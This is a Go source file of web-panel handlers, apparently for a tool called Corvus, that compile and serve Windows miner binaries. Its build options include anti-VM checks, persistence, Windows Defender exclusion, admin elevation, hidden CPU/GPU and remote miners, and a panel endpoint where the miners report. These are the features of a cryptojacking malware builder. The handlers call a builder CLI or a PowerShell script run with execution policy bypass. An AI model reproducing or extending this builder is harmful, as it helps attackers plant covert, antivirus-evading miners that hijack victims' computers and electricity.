package handlers

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"time"
)

// BuildRequest is the JSON body accepted by /api/build. It maps one-to-one onto
// the flags understood by the Linux CLI builder (BuilderCLI).
type BuildRequest struct {
	PanelURLs         string `json:"panel_urls"`
	ConfigURL         string `json:"config_url"`
	ContractAddress   string `json:"contract_address"`
	EmbeddedConfig    string `json:"embedded_config"` // legacy: "auto"/"none"
	EmbeddedMode      string `json:"embedded_mode"`   // none | panel | custom
	EmbeddedJSON      string `json:"embedded_json"`   // used when mode == custom
	ProcessMonitoring bool   `json:"process_monitoring"`
	DebugConsole      bool   `json:"debug_console"`
	AntiVM            bool   `json:"anti_vm"`
	Persistence       bool   `json:"persistence"`
	RemoteMiners      bool   `json:"remote_miners"`
	AdminManifest     bool   `json:"admin_manifest"`
	DefenderExclusion bool   `json:"defender_exclusion"`
	CPUMiner          *bool  `json:"cpu_miner"`
	GPUMiner          *bool  `json:"gpu_miner"`
	FileName          string `json:"file_name"`
}

// buildResult mirrors the document emitted by `builder -json`.
type buildResult struct {
	Success    bool     `json:"success"`
	Output     string   `json:"output"`
	Bytes      int64    `json:"bytes"`
	SHA256     string   `json:"sha256"`
	DurationMS int64    `json:"duration_ms"`
	BuildDir   string   `json:"build_dir"`
	Warnings   []string `json:"warnings"`
	Error      string   `json:"error"`
}

// BuildFile describes a binary in static/builds, both for the page render and
// the /api/builds JSON response.
type BuildFile struct {
	Name         string    `json:"name"`
	Size         int64     `json:"size"`
	ModifiedTime time.Time `json:"modified_time"`
	URL          string    `json:"url"`
}

// hostGOOS is a variable so tests can exercise the Windows code path on Linux.
var hostGOOS = runtime.GOOS

// buildSpec is the JSON document handed to the Windows builder (build.ps1).
// Field names match the Linux CLI flags one-to-one.
type buildSpec struct {
	PanelURLs         string `json:"panel_urls"`
	ConfigURL         string `json:"config_url"`
	ContractAddress   string `json:"contract_address,omitempty"`
	EmbeddedConfig    string `json:"embedded_config,omitempty"`
	ProcessMonitoring bool   `json:"process_monitoring"`
	DebugConsole      bool   `json:"debug_console"`
	AntiVM            bool   `json:"anti_vm"`
	Persistence       bool   `json:"persistence"`
	RemoteMiners      bool   `json:"remote_miners"`
	AdminManifest     bool   `json:"admin_manifest"`
	DefenderExclusion bool   `json:"defender_exclusion"`
	CPUMiner          bool   `json:"cpu_miner"`
	GPUMiner          bool   `json:"gpu_miner"`
	Source            string `json:"source"`
	Output            string `json:"output"`
	Name              string `json:"name"`
	KeepBuild         bool   `json:"keep_build"`
}

// buildBackend describes how this host compiles the client.
type buildBackend struct {
	kind   string // "cli" (BuilderCLI) or "powershell" (Builder/build.ps1)
	path   string // CLI executable or PowerShell host
	script string // build.ps1 path (powershell only)
}

func (b *buildBackend) label() string {
	if b.kind == "powershell" {
		return "Windows build.ps1"
	}
	return "builder CLI"
}

// resolveBackend picks the builder for the current host. Windows uses the
// PowerShell script the GUI already drives; everything else uses BuilderCLI.
// CORVUS_BUILDER always forces the CLI backend.
func (h *Handler) resolveBackend() (*buildBackend, error) {
	if hostGOOS == "windows" && strings.TrimSpace(os.Getenv("CORVUS_BUILDER")) == "" {
		shell, err := exec.LookPath("powershell.exe")
		if err != nil {
			if pwsh, pwshErr := exec.LookPath("pwsh"); pwshErr == nil {
				shell = pwsh
			} else {
				return nil, fmt.Errorf("powershell not found: %v", err)
			}
		}
		script, err := h.windowsBuildScript()
		if err != nil {
			return nil, err
		}
		return &buildBackend{kind: "powershell", path: shell, script: script}, nil
	}

	exe, err := h.builderExecutable()
	if err != nil {
		return nil, err
	}
	return &buildBackend{kind: "cli", path: exe}, nil
}

// windowsBuildScript locates Builder/build.ps1 (or a CORVUS_BUILD_SCRIPT override).
func (h *Handler) windowsBuildScript() (string, error) {
	var candidates []string
	if env := strings.TrimSpace(os.Getenv("CORVUS_BUILD_SCRIPT")); env != "" {
		candidates = append(candidates, env)
	}
	candidates = append(candidates,
		filepath.Join(h.baseDir, "..", "Builder", "build.ps1"),
		filepath.Join(h.baseDir, "..", "build.ps1"),
		filepath.Join(h.baseDir, "build.ps1"),
	)
	for _, candidate := range candidates {
		abs, err := filepath.Abs(candidate)
		if err != nil {
			continue
		}
		if info, err := os.Stat(abs); err == nil && !info.IsDir() {
			return abs, nil
		}
	}
	return "", fmt.Errorf("build.ps1 not found (looked for %s); set CORVUS_BUILD_SCRIPT", strings.Join(candidates, ", "))
}

// cliBuildArgs renders a spec as BuilderCLI flags.
func cliBuildArgs(spec buildSpec) []string {
	args := []string{
		"-output", spec.Output,
		"-name", spec.Name,
		"-source", spec.Source,
		"-json",
	}
	if spec.PanelURLs != "" {
		args = append(args, "-panel-urls", spec.PanelURLs)
	}
	if spec.ConfigURL != "" {
		args = append(args, "-config-url", spec.ConfigURL)
	}
	if spec.ContractAddress != "" {
		args = append(args, "-contract-address", spec.ContractAddress)
	}
	if spec.EmbeddedConfig != "" {
		args = append(args, "-embedded-config", spec.EmbeddedConfig)
	}
	if spec.ProcessMonitoring {
		args = append(args, "-monitoring")
	}
	if spec.DebugConsole {
		args = append(args, "-debug")
	}
	if spec.AntiVM {
		args = append(args, "-antivm")
	}
	if spec.Persistence {
		args = append(args, "-persistence")
	}
	if spec.RemoteMiners {
		args = append(args, "-remote-miners")
	}
	if spec.AdminManifest {
		args = append(args, "-admin")
	}
	if spec.DefenderExclusion {
		args = append(args, "-defender-exclusion")
	}
	args = append(args, fmt.Sprintf("-cpu-miner=%t", spec.CPUMiner), fmt.Sprintf("-gpu-miner=%t", spec.GPUMiner))
	return args
}

// buildTimeout bounds a single cross-compilation. Client builds take well under
// a minute on a normal machine; the margin covers slow machines.
const buildTimeout = 25 * time.Minute

// buildOutputDir returns the directory served under /static/builds/.
func (h *Handler) buildOutputDir() string {
	return filepath.Join(h.baseDir, "static", "builds")
}

// builderExecutable locates the Linux CLI builder. CORVUS_BUILDER overrides the
// search, which is what a packaged deployment should use.
func (h *Handler) builderExecutable() (string, error) {
	var candidates []string
	if env := strings.TrimSpace(os.Getenv("CORVUS_BUILDER")); env != "" {
		candidates = append(candidates, env)
	}
	candidates = append(candidates,
		filepath.Join(h.baseDir, "..", "builder"),
		filepath.Join(h.baseDir, "builder"),
		filepath.Join(h.baseDir, "..", "builder.exe"),
		filepath.Join(h.baseDir, "builder.exe"),
	)

	for _, candidate := range candidates {
		abs, err := filepath.Abs(candidate)
		if err != nil {
			continue
		}
		info, err := os.Stat(abs)
		if err != nil || info.IsDir() {
			continue
		}
		if info.Mode()&0o111 == 0 {
			continue
		}
		return abs, nil
	}

	return "", fmt.Errorf(
		"builder executable not found (looked for %s); build it with: cd BuilderCLI && go build -trimpath -ldflags=\"-s -w\" -o ../builder .",
		strings.Join(candidates, ", "))
}

// clientSourceDir locates the Client/ tree the builder should compile.
func (h *Handler) clientSourceDir() (string, error) {
	var candidates []string
	if env := strings.TrimSpace(os.Getenv("CORVUS_CLIENT_SOURCE")); env != "" {
		candidates = append(candidates, env)
	}
	candidates = append(candidates,
		filepath.Join(h.baseDir, "..", "Client"),
		filepath.Join(h.baseDir, "Client"),
	)

	for _, candidate := range candidates {
		abs, err := filepath.Abs(candidate)
		if err != nil {
			continue
		}
		if _, err := os.Stat(filepath.Join(abs, "CMakeLists.txt")); err != nil {
			continue
		}
		if _, err := os.Stat(filepath.Join(abs, "src", "main.cpp")); err != nil {
			continue
		}
		return abs, nil
	}

	return "", fmt.Errorf("client source not found (looked for %s); set CORVUS_CLIENT_SOURCE", strings.Join(candidates, ", "))
}

// BuildMiner builds a client binary from the posted settings and leaves it in
// static/builds. It responds with JSON; the binary itself is served separately
// so the page can list and download builds.
func (h *Handler) BuildMiner(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req BuildRequest
	if err := json.NewDecoder(io.LimitReader(r.Body, 64<<10)).Decode(&req); err != nil {
		writeBuildError(w, http.StatusBadRequest, "Invalid request body: "+err.Error(), "")
		return
	}

	req.PanelURLs = strings.TrimSpace(req.PanelURLs)
	req.ConfigURL = strings.TrimSpace(req.ConfigURL)
	req.ContractAddress = strings.TrimSpace(req.ContractAddress)

	if req.PanelURLs == "" && req.ConfigURL == "" && req.ContractAddress == "" {
		writeBuildError(w, http.StatusBadRequest, "Provide panel URL(s), a config URL or a contract address", "")
		return
	}

	cpuMiner := true
	if req.CPUMiner != nil {
		cpuMiner = *req.CPUMiner
	}
	gpuMiner := req.GPUMiner != nil && *req.GPUMiner
	if !cpuMiner && !gpuMiner && !req.RemoteMiners {
		writeBuildError(w, http.StatusBadRequest, "Enable at least one miner (CPU, GPU or remote miners)", "")
		return
	}

	backend, err := h.resolveBackend()
	if err != nil {
		log.Printf("Build unavailable: %v", err)
		writeBuildError(w, http.StatusInternalServerError, err.Error(), "")
		return
	}
	clientDir, err := h.clientSourceDir()
	if err != nil {
		log.Printf("Build unavailable: %v", err)
		writeBuildError(w, http.StatusInternalServerError, err.Error(), "")
		return
	}

	outputDir := h.buildOutputDir()
	if err := os.MkdirAll(outputDir, 0o755); err != nil {
		writeBuildError(w, http.StatusInternalServerError, "Could not create build output directory: "+err.Error(), "")
		return
	}

	name := sanitizeBuildName(req.FileName)
	if name == "" {
		name = fmt.Sprintf("corvus_%d.exe", time.Now().Unix())
	}

	// Render the stored fallback config (or the posted one) to a temp file. The
	// mode comes from the UI; an older page that only sends "auto"/"none" is
	// mapped onto panel/none.
	embeddedPath, cleanupEmbedded, err := h.materializeEmbeddedConfig(req.EmbeddedMode, req.EmbeddedJSON, req.EmbeddedConfig)
	if err != nil {
		writeBuildError(w, http.StatusBadRequest, "Fallback config: "+err.Error(), "")
		return
	}
	defer cleanupEmbedded()
	embeddedSetting := embeddedModeNone
	if embeddedPath != "" {
		embeddedSetting = embeddedPath
		log.Printf("Embedding fallback config for build %s", name)
	}

	spec := buildSpec{
		PanelURLs:         req.PanelURLs,
		ConfigURL:         req.ConfigURL,
		ContractAddress:   req.ContractAddress,
		EmbeddedConfig:    embeddedSetting,
		ProcessMonitoring: req.ProcessMonitoring,
		DebugConsole:      req.DebugConsole,
		AntiVM:            req.AntiVM,
		Persistence:       req.Persistence,
		RemoteMiners:      req.RemoteMiners,
		AdminManifest:     req.AdminManifest,
		DefenderExclusion: req.DefenderExclusion,
		CPUMiner:          cpuMiner,
		GPUMiner:          gpuMiner,
		Source:            clientDir,
		Output:            outputDir,
		Name:              name,
	}

	// The build must not be cancelled when the browser disconnects, so it runs
	// on a background context with its own timeout.
	ctx, cancel := context.WithTimeout(context.Background(), buildTimeout)
	defer cancel()

	var cmd *exec.Cmd
	switch backend.kind {
	case "powershell":
		specPath, specErr := writeSpecFile(spec)
		if specErr != nil {
			writeBuildError(w, http.StatusInternalServerError, "Could not write build spec: "+specErr.Error(), "")
			return
		}
		defer os.Remove(specPath)
		cmd = exec.CommandContext(ctx, backend.path,
			"-NoProfile", "-ExecutionPolicy", "Bypass",
			"-File", backend.script,
			"-panel_config", specPath,
			"-json",
		)
		log.Printf("Build started: %s -File %s (spec %s)", backend.path, backend.script, specPath)
	default:
		args := cliBuildArgs(spec)
		cmd = exec.CommandContext(ctx, backend.path, args...)
		log.Printf("Build started: %s %s", backend.path, strings.Join(args, " "))
	}
	cmd.Dir = filepath.Dir(clientDir)

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr
	runErr := cmd.Run()
	logTail := tailString(stderr.String(), 8<<10)

	var result buildResult
	parseErr := json.Unmarshal(bytes.TrimSpace(stdout.Bytes()), &result)
	if parseErr != nil && runErr == nil {
		runErr = fmt.Errorf("could not parse builder output: %v", parseErr)
	}
	if runErr != nil || !result.Success {
		message := result.Error
		if message == "" && runErr != nil {
			message = runErr.Error()
		}
		if message == "" {
			message = "build failed"
		}
		if ctx.Err() == context.DeadlineExceeded {
			message = fmt.Sprintf("build timed out after %s", buildTimeout)
		}
		log.Printf("Build failed: %s\n%s", message, logTail)

		// Remove a half-written artifact so it cannot be downloaded.
		os.Remove(filepath.Join(outputDir, name))
		writeBuildError(w, http.StatusInternalServerError, message, logTail)
		return
	}

	log.Printf("Build finished in %d ms: %s (%d bytes)", result.DurationMS, result.Output, result.Bytes)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"success":     true,
		"file":        name,
		"url":         "/static/builds/" + name,
		"bytes":       result.Bytes,
		"sha256":      result.SHA256,
		"duration_ms": result.DurationMS,
		"warnings":    result.Warnings,
	})
}

// writeSpecFile persists the build spec for build.ps1 and returns its path.
func writeSpecFile(spec buildSpec) (string, error) {
	data, err := json.MarshalIndent(spec, "", "  ")
	if err != nil {
		return "", err
	}
	f, err := os.CreateTemp("", "corvus-build-spec-*.json")
	if err != nil {
		return "", err
	}
	path := f.Name()
	if _, err := f.Write(data); err != nil {
		f.Close()
		os.Remove(path)
		return "", err
	}
	if err := f.Close(); err != nil {
		os.Remove(path)
		return "", err
	}
	return path, nil
}

func writeBuildError(w http.ResponseWriter, status int, message, output string) {
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(status)
	json.NewEncoder(w).Encode(map[string]any{
		"success": false,
		"error":   message,
		"output":  output,
	})
}

// BuilderPage renders the builder form and the list of previous builds.
func (h *Handler) BuilderPage(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	backend, builderErr := h.resolveBackend()
	builderPath := ""
	backendLabel := ""
	if backend != nil {
		builderPath = backend.path
		backendLabel = backend.label()
		if backend.kind == "powershell" {
			builderPath = backend.script
		}
	}
	clientDir, clientErr := h.clientSourceDir()

	scheme := "http"
	if r.TLS != nil {
		scheme = "https"
	}

	embMode, embCustom, _ := h.loadEmbeddedSetting()
	embDerived, derivedErr := h.derivedEmbeddedConfig()
	if derivedErr != nil {
		embDerived = ""
	}
	if embMode == embeddedModePanel {
		embCustom = embDerived
	}

	data := map[string]any{
		"quote":           getRandomQuote(),
		"builds":          h.listBuilds(),
		"embeddedMode":    embMode,
		"embeddedJSON":    embCustom,
		"embeddedDerived": embDerived,
		"builderReady":    builderErr == nil && clientErr == nil,
		"builderPath":     builderPath,
		"builderBackend":  backendLabel,
		"builderError":    firstError(builderErr, clientErr),
		"clientDir":       clientDir,
		"defaultPanelURL": fmt.Sprintf("%s://%s/api/miners/submit", scheme, r.Host),
	}

	layoutPath := filepath.Join(h.baseDir, "templates", "layout.html")
	builderTpl := filepath.Join(h.baseDir, "templates", "builder.html")
	tmpl, err := template.New("layout").Funcs(template.FuncMap{
		"formatSize": formatSizeFunc,
		"formatTime": formatTimeFunc,
	}).ParseFiles(layoutPath, builderTpl)
	if err != nil {
		log.Printf("Error parsing templates: %v", err)
		http.Error(w, "Error loading template", http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "text/html")
	tmpl.ExecuteTemplate(w, "layout", data)
}

// listBuilds returns the build artifacts, newest first.
func (h *Handler) listBuilds() []BuildFile {
	dir := h.buildOutputDir()
	entries, err := os.ReadDir(dir)
	if err != nil {
		if !os.IsNotExist(err) {
			log.Printf("Error reading builds directory: %v", err)
		}
		return []BuildFile{}
	}

	builds := make([]BuildFile, 0, len(entries))
	for _, entry := range entries {
		if entry.IsDir() {
			continue
		}
		info, err := entry.Info()
		if err != nil {
			continue
		}
		builds = append(builds, BuildFile{
			Name:         entry.Name(),
			Size:         info.Size(),
			ModifiedTime: info.ModTime(),
			URL:          "/static/builds/" + entry.Name(),
		})
	}

	// os.ReadDir is sorted by name; surface the newest artifacts first.
	sort.Slice(builds, func(i, j int) bool {
		return builds[i].ModifiedTime.After(builds[j].ModifiedTime)
	})
	return builds
}

// ListBuilds returns all built binaries as JSON.
func (h *Handler) ListBuilds(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(h.listBuilds())
}

// DeleteBuild removes a specific build file.
func (h *Handler) DeleteBuild(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodDelete && r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var req struct {
		Filename string `json:"filename"`
	}
	// Accept both JSON and form bodies so the page can use either.
	if strings.HasPrefix(r.Header.Get("Content-Type"), "application/json") {
		if err := json.NewDecoder(io.LimitReader(r.Body, 4<<10)).Decode(&req); err != nil {
			writeBuildError(w, http.StatusBadRequest, "Invalid request body", "")
			return
		}
	} else {
		req.Filename = r.FormValue("filename")
		if req.Filename == "" {
			req.Filename = r.FormValue("name")
		}
	}

	if req.Filename == "" {
		writeBuildError(w, http.StatusBadRequest, "Filename is required", "")
		return
	}
	if filepath.Base(req.Filename) != req.Filename {
		writeBuildError(w, http.StatusBadRequest, "Invalid filename", "")
		return
	}

	buildPath := filepath.Join(h.buildOutputDir(), req.Filename)
	if _, err := os.Stat(buildPath); os.IsNotExist(err) {
		writeBuildError(w, http.StatusNotFound, "File not found", "")
		return
	}
	if err := os.Remove(buildPath); err != nil {
		log.Printf("Error deleting build %s: %v", req.Filename, err)
		writeBuildError(w, http.StatusInternalServerError, "Error deleting file", "")
		return
	}

	log.Printf("Deleted build file: %s", req.Filename)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"success": true, "message": "File deleted"})
}

// sanitizeBuildName turns a user-supplied name into a safe file name and makes
// sure it ends in .exe. Returns "" when nothing usable is left.
func sanitizeBuildName(name string) string {
	name = filepath.Base(strings.ReplaceAll(strings.TrimSpace(name), "\\", "/"))

	var b strings.Builder
	for _, r := range name {
		switch {
		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9', r == '.', r == '-', r == '_':
			b.WriteRune(r)
		}
	}

	out := strings.Trim(b.String(), ".")
	if out == "" {
		return ""
	}
	if !strings.HasSuffix(strings.ToLower(out), ".exe") {
		out += ".exe"
	}
	return out
}

func tailString(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return "..." + s[len(s)-max:]
}

func firstError(errs ...error) string {
	for _, err := range errs {
		if err != nil {
			return err.Error()
		}
	}
	return ""
}

func formatSizeFunc(n int64) string {
	const unit = 1024
	if n < unit {
		return fmt.Sprintf("%d B", n)
	}
	div, exp := int64(unit), 0
	for v := n / unit; v >= unit; v /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %ciB", float64(n)/float64(div), "KMGTPE"[exp])
}

func formatTimeFunc(t time.Time) string {
	return t.Format("2006-01-02 15:04:05")
}
